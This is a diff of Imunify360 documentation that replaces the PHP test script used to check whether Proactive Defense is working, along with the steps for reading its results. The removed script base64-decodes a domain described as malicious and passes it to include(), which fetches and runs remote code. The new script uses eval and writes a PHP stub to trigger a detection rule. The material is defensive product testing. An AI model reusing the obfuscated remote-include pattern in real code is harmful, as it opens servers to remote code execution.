@@ -966,29 +966,94 @@ The <span class="notranslate">_Ignore List_</span> table includes the following 
 
 ``` PHP
 <?php
-/* Imunify360 Proactive Defence test script */
-
-echo "<pre>";
-echo "Step 1<br>";
-
-// Decode string with domain: 37kddsserrt.xyz
-$url=base64_decode("MzdrZGRzc2VycnQueHl6");
-
-echo "Step 2<br>";
-echo "</pre>";
-
-// Try to access a malicious domain
-include($url);
-die();
+$ffile = tmpfile();
+$string2 = 'test';
+$triim = trim($string2, "s");
+$string = 'cup';
+$name = 'coffee';
+$str = 'This is a $string with my $name in it.';
+$arr = array('Hello','World!','Beautiful','Day!');
+eval("\$str = \"$str\";");
+$a = 1;
+while($a <= 255) {
+$aaa = is_string($string2);
+$a++;
+}
+$b = 1;
+while($b <= 255) {
+$bbb = strstr($string2, '1');
+$ccc = strchr($string2, '2');
+$b++;
+}
+$c = 1;
+while($c <= 255) {
+$ccc = strtoupper($string2);
+$ddd = crc32($string2);
+$c++;
+}
+$d =1;
+while($d <= 255) {
+$ddd = strtolower($string2);
+$ttt = join(" ",$arr);
+$d++;
+}
+$e =1;
+while($e <= 255) {
+$eee = is_bool($string2);
+$ppp = implode(",", $arr);
+$e++;
+}
+$f = 1;
+while($f <= 255) {
+$fff = strlen($string2);
+$kkk = str_word_count($string2, 1);
+$f++;
+}
+$g = 1;
+while($g <= 255) {
+$ggg = is_array($string2);
+$g++;
+}
+$h = 1;
+while($h <= 255) {
+$hhh = is_null($string2);
+$sss = ltrim($string2);
+$h++;
+}
+$j = 1;
+while($j <= 255) {
+$jjj = is_int($string2);
+$j++;
+}
+while($k <= 255) {
+$kkk = is_numeric($string2);
+$k++;
+}
+$triim = trim($string2, "t");
+if (@file_put_contents($ffile, "<?php\n;") !== false){
+print "PD doesn't work or not in KILL mode";
+}
+fclose($ffile);
 ?>
 ```
 </div>
 
 3. Place this file on the server.
 4. Call a test page with the script from the point 2.
-5. If <span class="notranslate">Proactive Defense</span> is disabled, you will see _Step 1_ and _Step 2_ strings after calling the script.
-6. If <span class="notranslate">Proactive Defense</span> is enabled and <span class="notranslate">_Log only_</span> mode is set, you will see _Step 1_ and _Step 2_ strings after calling the script and a new event in the <span class="notranslate">_Detected Events_</span> table.
-7. If <span class="notranslate">Proactive Defense</span> is enabled and <span class="notranslate">_Kill mode_</span> is set, the test page returns an error.
+5. If <span class="notranslate">Proactive Defense</span> is disabled, you will see "PD doesn't work or not in KILL mode" message after calling the script and no records will appear in "Incident" tab.
+6. If <span class="notranslate">Proactive Defense</span> is enabled and <span class="notranslate">_Log only_</span> mode is set, you will see "PD doesn't work or not in KILL mode" message after calling the script and a new event with description "Blamer detection" in the <span class="notranslate">_Detected Events_</span> table with "LOG" action.
+7. If <span class="notranslate">Proactive Defense</span> is enabled and <span class="notranslate">_Kill mode_</span> is set, the test page returns an error.And a new event with description "Blamer detection" in the <span class="notranslate">_Detected Events_</span> table with "KILL" action.
+
+::: tip Note
+the number of triggered rule is 24 and it is possible to check it via CLI
+<div class="notranslate">
+
+```
+imunify360-agent proactive list
+```
+</div>
+:::
+
 
 ## Reputation Management
 
